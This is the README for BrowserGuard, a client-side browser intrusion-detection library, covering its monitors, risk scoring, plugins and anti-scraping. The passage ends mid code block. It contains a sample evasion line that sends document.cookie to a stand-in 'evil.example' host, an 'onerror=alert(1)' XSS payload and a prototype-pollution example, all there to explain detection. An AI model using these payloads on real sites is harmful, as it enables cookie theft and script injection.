# @puertochenta/browser-guard

> **English** · [Español](README.es.md)

**Browser Runtime Security / Client-Side Intrusion Detection** for web applications.

BrowserGuard runs inside the browser, observes your application's runtime and detects
indicators of suspicious behavior: unexpected network connections, dynamic script injection,
CSP violations, prototype pollution and tampering with native functions. Every finding gets a
risk score (0-100) and a severity, and is reported locally.

```ts
import { BrowserGuard } from "@puertochenta/browser-guard";

const Guard = BrowserGuard.Start({ Preset: "strict" });

Guard.On("Threat", (Finding) => {
  console.log(Finding);
});
```

- ESM, bundled TypeScript types and tree shaking (`sideEffects: false`).
- Zero runtime dependencies. Framework-agnostic: React, Vue, Angular, Svelte or vanilla JS.
- Optional features ship as plugins on separate entry points: you only download what you use.
- Safe to import during SSR (Next.js, Nuxt): it only activates in the browser.
- Tested in real Chromium, Firefox and WebKit against the published bundle.

---

## Contents

- [What BrowserGuard is](#what-browserguard-is)
- [What BrowserGuard is not](#what-browserguard-is-not)
- [Installation](#installation)
- [Quick start](#quick-start)
- [API](#api)
- [Configuration](#configuration)
- [Presets](#presets)
- [Monitors](#monitors)
- [Detection and risk scoring](#detection-and-risk-scoring)
- [Events](#events)
- [Examples](#examples)
- [Plugins](#plugins)
- [Remote reporting](#remote-reporting)
- [Anti-scraping](#anti-scraping)
- [Limitations](#limitations)
- [Security](#security)
- [Performance](#performance)
- [Architecture](#architecture)
- [Development](#development)
- [Roadmap](#roadmap)

---

## What BrowserGuard is

A **client-side security observability** layer. Its model is strictly:

```text
observe → analyze → score → report
```

BrowserGuard:

- observes `fetch`, `XMLHttpRequest`, `WebSocket`, `sendBeacon`, `EventSource`, forms,
  `window.open`, resource loads, service workers, insertion of `<script>`, `<iframe>`,
  `<object>` and `<embed>`, DOM XSS sinks (`innerHTML`, `document.write`, ...), CSP violations,
  native prototypes and critical runtime functions;
- analyzes those events with specialized detectors;
- assigns a risk score and a severity (`info`, `low`, `medium`, `high`, `critical`);
- reports through events your application can subscribe to (for example, to forward them to
  your SIEM).

It helps detect, in production, behavior consistent with XSS, skimming (Magecart),
compromised dependencies, malicious extensions or data exfiltration, and to audit during
development what your application really does.

## What BrowserGuard is not

- **It does not detect "any attack".** It detects _indicators_ of suspicious behavior. An
  attacker who runs code before BrowserGuard, or who knows how it works, can evade it (see
  [Limitations](#limitations)).
- **It does not block network requests or scripts.** It detects and reports. The only active
  reaction is the optional content protection of [Anti-scraping](#anti-scraping).
- **It does not replace** CSP, Trusted Types, SRI, a WAF, an EDR, a SIEM or backend security.
  It is a complementary visibility layer. A strict CSP is still the best defense.
- **It is not telemetry.** Nothing is sent to any server by default; remote reporting only
  starts when you configure your own endpoint.

## Installation

```bash
pnpm add @puertochenta/browser-guard
# or
npm install @puertochenta/browser-guard
# or
yarn add @puertochenta/browser-guard
```

Requires a modern browser (ES2020, `Proxy`, `MutationObserver`).

## Quick start

> **Start BrowserGuard as early as possible.** It can only observe what happens _after_
> `Start()`. Import the bootstrap module before any other application code.

```ts
import { BrowserGuard } from "@puertochenta/browser-guard";

const Guard = BrowserGuard.Start({
  Preset: "strict",

  Network: {
    AllowedOrigins: [window.location.origin, "https://api.example.com"],
  },

  Dom: {
    AllowedScriptOrigins: [window.location.origin, "https://cdn.example.com"],
  },
});

Guard.On("Critical", (Finding) => {
  console.error(Finding);
});
```

## API

| Method                                                         | Description                                                                                                                                                                 |
| -------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `BrowserGuard.Start(config?)`                                  | Starts every enabled monitor and returns the active instance. **Idempotent**: if an instance is already running it is returned and the new config is ignored. Inert in SSR. |
| `BrowserGuard.Stop()` / `Guard.Stop()`                         | Stops the monitors and restores **every** intercepted function, listener, observer and timer.                                                                               |
| `BrowserGuard.On(event, handler)` / `Guard.On(...)`            | Subscribes a handler. Returns an unsubscribe function.                                                                                                                      |
| `BrowserGuard.Off(event, handler)` / `Guard.Off(...)`          | Unsubscribes a handler.                                                                                                                                                     |
| `Guard.Once(event, handler)`                                   | One-shot subscription.                                                                                                                                                      |
| `BrowserGuard.GetReport()` / `Guard.GetReport()`               | Finding history and statistics.                                                                                                                                             |
| `BrowserGuard.GetStatus()` / `Guard.GetStatus()`               | Running state, active monitors, internal counters.                                                                                                                          |
| `BrowserGuard.GetTimeline()` / `Guard.GetTimeline()`           | Timeline of internal events (forensic mode only).                                                                                                                           |
| `BrowserGuard.GetInstance()`                                   | Running instance or `null`.                                                                                                                                                 |
| `Guard.GetConfig()`                                            | Copy of the effective configuration.                                                                                                                                        |
| `BrowserGuard.GetBotAssessment()` / `Guard.GetBotAssessment()` | Anti-scraping verdict for the session (`null` when disabled).                                                                                                               |

Static methods act on the active instance; without one they do nothing (`GetReport()` and
`GetStatus()` return `null`).

```ts
const Report = Guard.GetReport();
// {
//   StartedAt: 1760000000000,
//   Findings: SecurityFinding[],
//   Statistics: { Total, Critical, High, Medium, Low, Info }
// }
```

### SecurityFinding

```ts
interface SecurityFinding {
  Id: string;
  Timestamp: number;
  Category:
    | "network"
    | "script-injection"
    | "prototype-pollution"
    | "runtime-integrity"
    | "csp"
    | "dom"
    | "xss"
    | "bot";
  Severity: "info" | "low" | "medium" | "high" | "critical";
  Title: string;
  Description: string;
  RiskScore: number; // 0 - 100
  Signals: string[]; // signals that contributed to the score
  EventId: string;
  Evidence?: unknown; // sanitized: never contains secrets
  Stack?: string; // cleaned, without BrowserGuard's internal frames
}
```

Findings are frozen (`Object.freeze`): handlers cannot tamper with the history.

## Configuration

Every property is optional. Missing values come from the preset (default: `balanced`). Invalid
input is ignored instead of throwing.

```ts
interface BrowserGuardConfig {
  Preset?: "development" | "balanced" | "strict" | "forensic";

  // "notice": only a monitoring notice (default, except in development)
  // "findings": every finding in detail (default in development)
  // "silent": nothing. true = "findings", false = "silent"
  Console?: boolean | "silent" | "notice" | "findings";

  Notice?: {
    Title?: string; // default: "Security monitoring active"
    Message?: string;
  };

  Monitors?: {
    Fetch?: boolean;
    Xhr?: boolean;
    WebSocket?: boolean;
    Dom?: boolean;
    Csp?: boolean;
    Prototype?: boolean;
    Runtime?: boolean; // integrity of critical functions
    Sinks?: boolean; // DOM XSS sinks: innerHTML, document.write, setTimeout("..."), ...
    Channels?: boolean; // sendBeacon, EventSource, window.open, forms, resources, service workers
    Realms?: boolean; // extend monitoring into same-origin iframes
  };

  Network?: {
    AllowedOrigins?: string[]; // "https://api.example.com" or "https://*.example.com"
    BlockedOrigins?: string[]; // detected and reported as critical; not blocked
  };

  Dom?: {
    AllowedScriptOrigins?: string[]; // the page's own origin is always allowed
  };

  Forensic?: {
    Enabled?: boolean;
    MaxEvents?: number; // ring buffer size (10 - 100000). Default: 1000
  };

  History?: {
    MaxFindings?: number; // retained findings (10 - 100000). Default: 500
  };

  Integrity?: {
    IntervalMs?: number; // prototype/runtime check interval (500 - 600000)
  };

  Risk?: {
    MinSeverity?: Severity; // threshold to record and emit findings
    Weights?: Partial<Record<RiskSignal, number>>; // see "Detection and risk scoring"
  };

  Reporters?: Reporter[]; // your own reporters (SIEM, analytics, ...)

  Plugins?: GuardPlugin[]; // optional features, see "Plugins"
}
```

Safe defaults:

- every monitor enabled;
- empty origin lists: every external origin is considered **unknown**;
- no forensic mode; history and timeline are always bounded;
- origins are normalized (lowercase, no path) and deduplicated.

## Presets

| Preset        | Finding threshold | Console                             | Integrity interval | Timeline          | Use                                                   |
| ------------- | ----------------- | ----------------------------------- | ------------------ | ----------------- | ----------------------------------------------------- |
| `development` | `info`            | `findings` from `info`              | 2 s                | no                | Maximum detail: info, warnings and suspicious events. |
| `balanced`    | `low`             | `notice`                            | 5 s                | no                | **Recommended** for general use.                      |
| `strict`      | `medium`          | `notice`                            | 3 s                | no                | Only relevant or high-risk behavior.                  |
| `forensic`    | `info`            | `notice` (`findings` from `medium`) | 2 s                | yes (1000 events) | Extended timeline for later analysis.                 |

`Risk.MinSeverity` overrides both the finding and console thresholds. The _Console_ column shows
the default mode; the threshold in parentheses applies if you choose `Console: "findings"`.

## Monitors

Monitors **only observe and emit events**; they never decide whether something is an attack.

| Monitor              | Observes                                                                                                                                                                                                                                | Records                                                                                                                                  |
| -------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------- |
| `FetchMonitor`       | `window.fetch`                                                                                                                                                                                                                          | sanitized URL, method, origin, timestamp, stack                                                                                          |
| `XhrMonitor`         | `XMLHttpRequest.prototype.open` / `send`                                                                                                                                                                                                | method, sanitized URL, origin, timestamp, stack (on send)                                                                                |
| `WebSocketMonitor`   | `new WebSocket()`                                                                                                                                                                                                                       | sanitized URL, origin, protocols, stack. Messages are not inspected.                                                                     |
| `DomMonitor`         | `MutationObserver` (childList + subtree)                                                                                                                                                                                                | inserted `script`, `iframe`, `object`, `embed`: `src`, `type`, `async`, `defer`, `integrity`, `crossOrigin`; for inline, only the length |
| `CspMonitor`         | `securitypolicyviolation` event                                                                                                                                                                                                         | `blockedURI`, `violatedDirective`, `effectiveDirective`, `sourceFile`, `lineNumber`, `columnNumber`, `disposition`                       |
| `PrototypeMonitor`   | `Object`, `Array`, `Function`, `String`, `Promise` `.prototype`                                                                                                                                                                         | added, removed or modified property descriptors                                                                                          |
| `RuntimeMonitor`     | `fetch`, `XHR.open/send`, `WebSocket`, `setTimeout`, `setInterval`, `eval`, `Function`, `Element.prototype.appendChild/setAttribute`, `Function.prototype.toString`                                                                     | replacement, removal or tampering before start                                                                                           |
| `SinkMonitor`        | `innerHTML`/`outerHTML` setters, `insertAdjacentHTML`, `document.write`, `createContextualFragment`, `srcdoc`, `setAttribute`, URL properties (`href`, `src`, `action`, `formAction`, `data`), `setTimeout`/`setInterval` with a string | sink, element, length and indicator names (never the content), stack                                                                     |
| `ChannelMonitor`     | `navigator.sendBeacon`, `new EventSource()`, `window.open`, form submissions (`submit` event and `form.submit()`), `serviceWorker.register`                                                                                             | destination (sanitized URL, origin, query length) and method; never bodies or form fields; stack                                         |
| `ResourceMonitor`    | resource downloads via `PerformanceObserver` (images, CSS, fonts, media, frames)                                                                                                                                                        | sanitized URL, origin, query length, initiator type                                                                                      |
| `RealmMonitor`       | `contentWindow` / `contentDocument` of same-origin iframes, and inserted iframes                                                                                                                                                        | installs the network, channel and sink monitors in the frame's realm; reports the access                                                 |
| `AutomationMonitor`  | automation and environment traces (only with `AntiScraping`)                                                                                                                                                                            | signal names, never values                                                                                                               |
| `InteractionMonitor` | mouse, keyboard, scroll, touch (only with `AntiScraping`)                                                                                                                                                                               | counters per event type and synthetic events; never keys or coordinates                                                                  |

**Transparent interception.** `fetch`, `XHR` and `WebSocket` are intercepted with a `Proxy`,
which preserves arguments, `this`, the Promise, the return value, errors, `name`, `length`,
static properties, `instanceof` and subclasses. An internal BrowserGuard error never reaches the
application.

**Safe restoration.** `Stop()` restores the exact original descriptor. If another library
wrapped the function _after_ BrowserGuard, restoring would break its chain: in that case the
interceptor becomes an inert passthrough and releases all its references.

**Reverts.** If a modification goes back to the initial state (for example, a property added
to a prototype is deleted, or `setTimeout` is restored), it is not reported.

## Detection and risk scoring

Detectors turn events into finding candidates carrying named **signals**. `RiskEngine` sums the
signal weights, clamps the result to 0-100 and maps it to a severity:

| Score    | 0-19 | 20-39 | 40-59  | 60-79 | 80-100   |
| -------- | ---- | ----- | ------ | ----- | -------- |
| Severity | info | low   | medium | high  | critical |

### NetworkDetector

| Destination                                                | Result                                     |
| ---------------------------------------------------------- | ------------------------------------------ |
| same-origin (includes `ws://`/`wss://` to the host)        | normal, no finding                         |
| `AllowedOrigins`                                           | normal, no finding                         |
| unknown external origin                                    | **medium** (45; WebSocket 55)              |
| unencrypted connection from an `https` page                | +15 → **high**                             |
| passive resource (image, CSS, font) from an unknown origin | **low** (25) — external CDNs are common    |
| query string of 64+ characters to an unknown origin        | +25 (exfiltration pattern: `?c=<cookies>`) |
| service worker registration                                | **low** (persistence capability)           |
| `BlockedOrigins`                                           | **critical** (takes precedence over allow) |

The same rules apply to every channel: `fetch`, XHR, WebSocket, `sendBeacon`, `EventSource`,
form submissions, `window.open` and resource loads. Only the query **length** is recorded,
never its content. Equivalent findings (same channel, origin and signals) are grouped for
10 seconds, so a gallery of 200 external images produces one finding.

### ScriptInjectionDetector

| Situation                                       | Result   |
| ----------------------------------------------- | -------- |
| external script from `AllowedScriptOrigins`     | info     |
| dynamic same-origin script                      | info     |
| dynamically inserted inline script              | low      |
| unknown external script (with `integrity`)      | medium   |
| unknown external script **without `integrity`** | high     |
| script with a `data:` or `javascript:` `src`    | high     |
| script from `BlockedOrigins`                    | critical |
| dynamic `iframe` to an unknown origin           | medium   |
| dynamic `object`/`embed` to an unknown origin   | high     |

Scripts inserted by the HTML parser (the page's original HTML) are not reported as dynamic.

### CspViolationDetector

Every violation is at least `low`. Violations of script directives rise to `medium`,
report-only mode lowers the risk and a blocked origin raises it to `critical`.

### PrototypePollutionDetector

Not every change is critical: a polyfill adding a method to `Array.prototype` is `low`. The risk
grows when the property is typical of payloads (`__proto__`, `constructor`, `prototype`,
`isAdmin`, `role`, `permissions`, `polluted`, ...), when the prototype is `Object.prototype`, or
when a native function is replaced or removed. Example: `Object.prototype.polluted = true` →
**critical**.

### RuntimeIntegrityDetector

| Situation                                                                          | Result   |
| ---------------------------------------------------------------------------------- | -------- |
| replaced by something that looks native (Proxy, `bind`)                            | medium   |
| replaced by a non-native function                                                  | high     |
| non-native replacement of `eval`, `Function` or `Function.prototype.toString`      | critical |
| function already modified when BrowserGuard started                                | medium   |
| function removed                                                                   | medium   |
| script accessed the realm of a same-origin iframe (monitoring is extended into it) | low      |

`NativeFunctionUtils` does not rely on `Function.prototype.toString()` alone: it combines the
source obtained through a **captured** `toString` reference (immune to later replacement), the
presence of an own `toString` (a hiding technique), an unexpected `prototype`, a matching `name`,
and reference comparison against the baseline.

### XssSinkDetector (DOM XSS)

`SinkMonitor` observes the APIs that turn a string into HTML or code: the `innerHTML` and
`outerHTML` setters (on elements and shadow roots), `insertAdjacentHTML`, `document.write` /
`writeln`, `Range.createContextualFragment`, `iframe.srcdoc`, `setAttribute` (event handlers and
`javascript:` URLs) and `setTimeout` / `setInterval` called with a **string**.

Writing HTML is normal, so only content with **indicators** is reported:

| Indicator                                                                    | Weight |
| ---------------------------------------------------------------------------- | ------ |
| Handler that runs without interaction (`onerror`, `onload`, `onfocus`, ...)  | 50     |
| Value taken from the page URL (query or hash) written to the sink            | 45     |
| `javascript:` URL (also entity-encoded; `javascript:void(0)` is ignored)     | 45     |
| `<script>` element                                                           | 40     |
| Inline handler that needs interaction (`onclick`, ...)                       | 30     |
| Code passed as a string to `setTimeout` / `setInterval`                      | 30     |
| Access to sensitive data or obfuscation (`document.cookie`, storage, `atob`) | 30     |
| Proof-of-concept call (`alert(`, `prompt(`, `confirm(`)                      | 25     |
| Embedded content (`iframe`, `object`, `embed`, `base`, `srcdoc`)             | 20     |
| `document.write` (legacy sink)                                               | +10    |

Examples: `<button onclick="save()">` → low; `<img src=x onerror=alert(1)>` → high; the same
payload taken from `?q=` in the URL (DOM-based reflected XSS) → critical.

Only the sink, the element, the length and the indicator names are recorded — **never the
content**. Identical writes are grouped for 10 seconds so a render loop cannot flood the
history.

> **Not intercepted on purpose: `eval` and `new Function`.** Replacing `eval` changes language
> semantics (a _direct_ `eval` only sees local variables when it is the original function), and
> replacing `Function` breaks checks such as `fn.constructor === Function`. That would alter the
> application. Their use is still visible through CSP `unsafe-eval` violations and
> `RuntimeMonitor`; full coverage is planned with Trusted Types (v0.3).

### Same-origin iframes (evasion through a clean realm)

Every iframe has its own `fetch`, `XMLHttpRequest`, `innerHTML`... Creating an empty iframe to get
unmonitored copies is the most common way to evade a client-side monitor:

```js
const frame = document.body.appendChild(document.createElement("iframe"));
frame.contentWindow.fetch("https://evil.example/?c=" + document.cookie);
```

`RealmMonitor` closes this gap: when a script reaches the realm of a same-origin iframe
(`contentWindow`, `contentDocument`), the network, channel and sink monitors are installed in it
**before** the value is returned, and the access is reported (low). Iframes are also protected
when inserted, which covers later access through `window.frames[i]`. Cross-origin iframes are
ignored: they cannot be observed, and talking to them with `postMessage` is legitimate.

### Custom weights

```ts
BrowserGuard.Start({
  Risk: {
    Weights: {
      "script.missing-integrity": 40, // enforce SRI more strictly
      "network.websocket": 0,
    },
  },
});
```

Available signals: `network.unknown-origin`, `network.blocked-origin`, `network.websocket`,
`network.insecure-transport`, `script.dynamic`, `script.external`, `script.inline`,
`script.unknown-origin`, `script.missing-integrity`, `script.blocked-origin`,
`script.dangerous-scheme`, `dom.embedded-content`, `dom.unknown-origin`, `dom.plugin-content`,
`dom.blocked-origin`, `csp.violation`, `csp.script-directive`, `csp.report-only`,
`csp.blocked-origin`, `prototype.added`, `prototype.removed`, `prototype.modified`,
`prototype.suspicious-key`, `prototype.object-root`, `prototype.native-overridden`,
`runtime.modified`, `runtime.preexisting`, `runtime.removed`, `runtime.non-native`,
`runtime.critical-target`, `xss.auto-event-handler`, `xss.event-handler`, `xss.script-tag`,
`xss.javascript-url`, `xss.embedded-content`, `xss.sensitive-access`, `xss.probe`,
`xss.url-reflected`, `xss.string-code`, `xss.legacy-sink`, `network.unknown-resource`,
`network.large-query`, `network.service-worker`, `runtime.realm-access`, and the `bot.*`
signals listed in
[Anti-scraping](#signals).

## Events

| Event                                       | Emitted for                                                |
| ------------------------------------------- | ---------------------------------------------------------- |
| `Finding`                                   | every finding above the configured threshold               |
| `Threat`                                    | findings of severity `low` or higher (excludes `info`)     |
| `Critical`, `High`, `Medium`, `Low`, `Info` | findings of exactly that severity                          |
| `Bot`                                       | anti-scraping verdict changes (receives a `BotAssessment`) |

```ts
Guard.On("Threat", Handler);

Guard.On("Critical", (Finding) => {
  SendToSiem(Finding);
});
```

The internal EventBus is not exposed. If one of your handlers throws, it does not interrupt
BrowserGuard or other handlers; the error is reported with `reportError` (like a DOM listener),
so it stays visible.

### Console output

Any end user can open the browser console. That is why, outside `development`, BrowserGuard
**does not print findings**: it shows a notice once per page (`"notice"` mode) and delivers the
findings to your code through `On()`. Users know the page is protected, but cannot see what was
detected, which origins you trust or how your configuration works.

```ts
BrowserGuard.Start({
  Preset: "strict", // Console: "notice" by default
  Notice: {
    Title: "Security monitoring active",
    Message:
      "Suspicious activity on this page is detected and reported to the site owner. " +
      "Do not paste or run code here that you do not understand.",
  },
});
```

The default text accurately describes what is monitored (the page's security behavior, not the
user's personal activity) and includes the usual _self-XSS_ warning. If you customize it, avoid
claims broader than what is actually recorded.

> The browser still shows its own messages (for example, CSP violations or network errors).
> BrowserGuard does not generate them and they cannot be suppressed from JavaScript.

To receive findings as the site owner, send them to your backend (see
[Send findings to your backend](#send-findings-to-your-backend)).

With `Console: "findings"` (default in `development`), `ConsoleReporter` uses `console.group`
(expanded) with `console.error` for `critical`/`high`, and `console.groupCollapsed` with
`console.warn` for `medium` and `console.info` for `low`/`info`. To avoid flooding the console,
it respects the preset threshold and suppresses equivalent findings (same category, title and
origin) for 10 seconds.

```text
╔════════════════════════════════════════╗
║ BrowserGuard                           ║
╚════════════════════════════════════════╝

HIGH SECURITY EVENT

Category:
script-injection

Unknown external script without integrity
A <script> element pointing to https://cdn.unknown.example (unknown) was inserted dynamically.

Origin:
https://cdn.unknown.example

Risk:
65 / 100
```

Stack traces are cleaned of internal frames:

```text
submitPayment() Payment.ts:82:5
onClick() Checkout.tsx:143:9
```

## Examples

### Vite + React

```ts
// SecurityBootstrap.ts
import { BrowserGuard } from "@puertochenta/browser-guard";

export const Guard = BrowserGuard.Start({
  Preset: "strict",
});
```

```tsx
// main.tsx
import "./SecurityBootstrap";

import React from "react";
import ReactDOM from "react-dom/client";

import App from "./App";

ReactDOM.createRoot(document.getElementById("root")!).render(<App />);
```

### Vue

```ts
// main.ts
import "./SecurityBootstrap";
import { createApp } from "vue";
import App from "./App.vue";

createApp(App).mount("#app");
```

### Angular

```ts
// main.ts
import "./SecurityBootstrap";
import { bootstrapApplication } from "@angular/platform-browser";
import { AppComponent } from "./app/app.component";

bootstrapApplication(AppComponent);
```

> Angular uses zone.js, which wraps `fetch`, `XMLHttpRequest`, `setTimeout` and other APIs. If
> BrowserGuard starts after zone.js, `RuntimeMonitor` reports those functions as modified before
> start. Disable it with `Monitors: { Runtime: false }` or lower the `runtime.preexisting` weight.

### Next.js / Nuxt (SSR)

Importing on the server is safe: without `window`, `Start()` returns an inert instance. Start
BrowserGuard from client-side code:

```tsx
// app/SecurityProvider.tsx (Next.js App Router)
"use client";
import { BrowserGuard } from "@puertochenta/browser-guard";

BrowserGuard.Start({ Preset: "balanced" });

export function SecurityProvider({ children }: { children: React.ReactNode }) {
  return children;
}
```

```ts
// plugins/browser-guard.client.ts (Nuxt)
import { BrowserGuard } from "@puertochenta/browser-guard";

export default defineNuxtPlugin(() => {
  BrowserGuard.Start({ Preset: "balanced" });
});
```

### Send findings to your backend

Add the `RemoteReporting` plugin and BrowserGuard sends findings to your server (see
[Remote reporting](#remote-reporting)):

```ts
import { BrowserGuard } from "@puertochenta/browser-guard";
import { RemoteReporting } from "@puertochenta/browser-guard/remote";

BrowserGuard.Start({
  Preset: "strict",
  Plugins: [
    RemoteReporting({
      Endpoint: "https://security.example.com/browser-guard/findings",
      Metadata: { App: "checkout", Version: "2.4.1", Environment: "production" },
    }),
  ],
});
```

If you prefer your own mechanism, subscribe to events or register your own reporter:

```ts
Guard.On("Critical", (Finding) => {
  MyMonitoring.CaptureSecurityEvent(Finding);
});

BrowserGuard.Start({
  Reporters: [{ Name: "Siem", Report: (Finding) => MySiem.Send(Finding) }],
});
```

### Forensic mode

```ts
const Guard = BrowserGuard.Start({ Preset: "forensic", Forensic: { MaxEvents: 2000 } });

// Later, for example on a critical finding:
Guard.On("Critical", () => {
  const Timeline = Guard.GetTimeline(); // recent events, including normal ones
});
```

### Demo

The repository includes an interactive demo in [`examples/vite-demo`](examples/vite-demo) with
buttons that trigger controlled events: allowed fetch, external fetch, blocked origin, WebSocket,
dynamic script, inline script, CSP violation, prototype and runtime tampering, and the
anti-scraping scenarios.

The demo sends its findings to the example collector [`examples/collector`](examples/collector),
a dependency-free Node server that prints them in the terminal, stores them in
`data/findings.jsonl` and shows them in a dashboard at `http://127.0.0.1:8787/`.

```bash
# Terminal 1: collector (what the site owner sees)
cd examples/collector
pnpm start

# Terminal 2: demo (what the end user sees)
cd examples/vite-demo
pnpm install
pnpm dev
```

## Plugins

Optional features are published as plugins on their own entry points. If you do not import a
plugin, its code is not in your bundle.

```ts
import { BrowserGuard } from "@puertochenta/browser-guard";
import { AntiScraping } from "@puertochenta/browser-guard/anti-scraping";
import { RemoteReporting } from "@puertochenta/browser-guard/remote";

BrowserGuard.Start({
  Preset: "strict",
  Plugins: [AntiScraping(), RemoteReporting({ Endpoint: "https://security.example.com/findings" })],
});
```

| Plugin            | Entry point                                 | Adds (min+gzip) |
| ----------------- | ------------------------------------------- | --------------- |
| core              | `@puertochenta/browser-guard`               | 18.0 KB         |
| `AntiScraping`    | `@puertochenta/browser-guard/anti-scraping` | +5.4 KB         |
| `RemoteReporting` | `@puertochenta/browser-guard/remote`        | +2.0 KB         |

The server-side verifier is a fourth entry point, `@puertochenta/browser-guard/server`, for your
backend (see [Server-side verification](#server-side-verification-challenge--proof-of-work)).

`GetStatus().Plugins` reports whether each plugin is active; for example, `RemoteReporting` with
an invalid endpoint stays inactive:

```ts
Guard.GetStatus().Plugins; // [{ Name: "AntiScraping", Active: true }, { Name: "RemoteReporting", Active: false }]
```

A plugin that throws during setup is marked inactive and never affects other plugins or the
application. Duplicate plugin names are ignored (the first one wins).

### Writing your own plugin

A plugin receives a `PluginHost` before the monitors start, so it can add monitors, detectors
and reporters, or react to every detection candidate:

```ts
import type { GuardPlugin } from "@puertochenta/browser-guard";

export function AuditTrail(): GuardPlugin {
  return {
    Name: "AuditTrail",
    Setup(host) {
      host.AddReporter({ Name: "AuditReporter", Report: (Finding) => MyAudit.Log(Finding) });
      host.OnCandidate((Candidate) => MyAudit.Count(Candidate.Category));
      host.OnDispose(() => MyAudit.Flush());
      return true; // active
    },
  };
}
```

## Remote reporting

The `RemoteReporting` plugin (`@puertochenta/browser-guard/remote`) sends findings to your
endpoint. Without it, nothing leaves the browser.

```ts
BrowserGuard.Start({
  Plugins: [RemoteReporting({ Endpoint: "https://security.example.com/findings" })],
});
```

```ts
interface RemoteConfig {
  Endpoint: string; // https, same origin or http://localhost
  MinSeverity?: Severity; // default: "low"
  BatchSize?: number; // 1 - 100. Default: 20
  FlushIntervalMs?: number; // 1000 - 60000. Default: 5000
  MaxQueue?: number; // 10 - 5000. Default: 200
  MaxRetries?: number; // 0 - 10. Default: 3
  Headers?: Record<string, string>; // visible to the client: no secrets
  Metadata?: Record<string, string | number | boolean>; // version, environment, ...
  IncludeStack?: boolean; // default: true
  IncludeEvidence?: boolean; // default: true
  IncludePagePath?: boolean; // default: true
}
```

**How it sends:**

- In batches: once `BatchSize` findings are queued or `FlushIntervalMs` elapses. With nothing
  pending, no timers are active.
- When the page is hidden or closed, and on `Stop()`, the pending queue is sent with
  `navigator.sendBeacon` (or `fetch` with `keepalive` when `Headers` are configured).
- Network errors, `5xx`, `408` and `429` are retried with exponential backoff (max 60 s). Other
  errors, or exhausted retries, drop the batch.
- Each payload is at most ~60 KB (the `keepalive`/`sendBeacon` limit). A finding that does not
  fit is sent without evidence or stack.
- Its own requests use the original `fetch`, captured before interception: they never create
  findings or loops.

**Payload** (`POST`, JSON body):

```json
{
  "Schema": "browser-guard.findings/v1",
  "SentAt": 1760000000000,
  "SessionId": "3f0c1d9e-…",
  "Page": { "Origin": "https://shop.example.com", "Path": "/checkout" },
  "Metadata": { "App": "checkout", "Version": "2.4.1" },
  "Findings": [{ "Id": "…", "Severity": "high", "Title": "…", "RiskScore": 65, "...": "..." }]
}
```

`SessionId` is random for each `Start()` and only groups the findings of one page load; it is
not persisted and does not identify the user.

**Your endpoint must:**

- accept `POST` with `Content-Type: application/json` **and** `text/plain` (used by
  `sendBeacon`), parsing the body as JSON in both cases;
- answer CORS (`OPTIONS` preflight) when it lives on another origin;
- be allowed by your CSP `connect-src` directive;
- treat everything it receives as **untrusted**: anyone can send fake findings to a public
  endpoint. Validate the schema, limit size and rate, and escape data when displaying it. The
  [example collector](examples/collector/server.mjs) shows these practices.

`GetStatus().Remote` exposes the counters `{ Queued, Sent, Dropped, Failed }`.

## Anti-scraping

Detection of automated browsers and scraping behavior, with configurable reactions, through
the `AntiScraping` plugin (`@puertochenta/browser-guard/anti-scraping`).

```ts
import { BrowserGuard } from "@puertochenta/browser-guard";
import { AntiScraping } from "@puertochenta/browser-guard/anti-scraping";
import { RemoteReporting } from "@puertochenta/browser-guard/remote";

const Guard = BrowserGuard.Start({
  Preset: "strict",
  Plugins: [AntiScraping(), RemoteReporting({ Endpoint: "https://security.example.com/findings" })],
});

Guard.On("Bot", (Assessment) => {
  // { Verdict: "unknown" | "human" | "suspicious" | "bot", Score, Signals, UpdatedAt }
});
```

### What it can and cannot do

> **No client-side protection stops all scraping.** Most scrapers (curl, Python `requests`,
> Scrapy) download the HTML or call your APIs **without running JavaScript**: BrowserGuard never
> loads for them. And an automated browser can block or neutralize any script. Use it as one
> more layer, together with server-side protection (rate limiting, API authentication, a bot
> management service).

What BrowserGuard adds:

| Layer     | What it does                                                                                                                                          |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------- |
| Detection | Identifies automation and bot behavior in real browsers.                                                                                              |
| Content   | Removes content marked as protected from the DOM when the session is a bot.                                                                           |
| Server    | Sends a verdict header: your API can reject bots **and clients that do not run BrowserGuard**, which is how scrapers that skip JavaScript are caught. |

Validated against headless Chrome and Firefox: a standard automated session is classified as
`bot` on load; a bot that hides `webdriver` and the headless user agent is not detected on load,
but is as soon as it crawls URLs sequentially and generates synthetic events.

### Signals

| Group (`Signals`) | Signal                                                                                | Weight       |
| ----------------- | ------------------------------------------------------------------------------------- | ------------ |
| `Automation`      | `navigator.webdriver`                                                                 | 80           |
|                   | Headless Chrome / PhantomJS (user agent or Client Hints)                              | 70           |
|                   | Traces of Selenium, chromedriver, Puppeteer/Playwright, PhantomJS, Nightmare, Cypress | 80           |
| `Environment`     | Software WebGL rendering (SwiftShader, llvmpipe)                                      | 25           |
|                   | User agent that does not match the platform, or Chrome without `window.chrome`        | 25           |
|                   | No languages / 0×0 window / desktop Chrome without plugins                            | 20 / 20 / 10 |
| `RequestRate`     | Sequential id crawl (`/product/1`, `/product/2`, ...)                                 | 45           |
|                   | Request burst per minute (`MaxRequestsPerMinute`)                                     | 35           |
| `Interaction`     | 10 or more script-generated input events (`isTrusted: false`)                         | 30           |
|                   | Tab visible for 30 s with no mouse, keyboard, touch or scroll                         | 30           |
|                   | Real human interaction                                                                | −25          |

**Verdict:** `bot` from 70 points, `suspicious` from 40; below that, `human` if there was real
interaction, otherwise `unknown`. Human interaction only offsets passive signals (environment,
lack of interaction): it never offsets automation or automated behavior (crawls, bursts,
synthetic events). A `bot` verdict is final for the session. Weights can be tuned with
`Risk.Weights`.

**Privacy:** environment checks compare browser values (WebGL renderer, languages, platform) and
**discard** them: only signal names such as `env-software-gl` are recorded and sent. No
identifying fingerprint is computed or transmitted. Interaction is measured with per-type
counters: never keys, coordinates or elements.

### Reactions

**1. Protected content.** Mark sensitive elements with `data-guard-protect`:

```html
<div data-guard-protect>Wholesale price: $1,249.00 · Stock: 312</div>
```

When the verdict reaches `ProtectAt` (default `bot`), their content is **removed from the DOM**
(not just hidden: a scraper reads the DOM, not the screen) and replaced with `Placeholder`.
`Stop()` puts it back intact. Elements inserted later are protected too.

In React, Vue or Angular, do not move nodes owned by the framework: read the verdict and do not
render the sensitive data.

```tsx
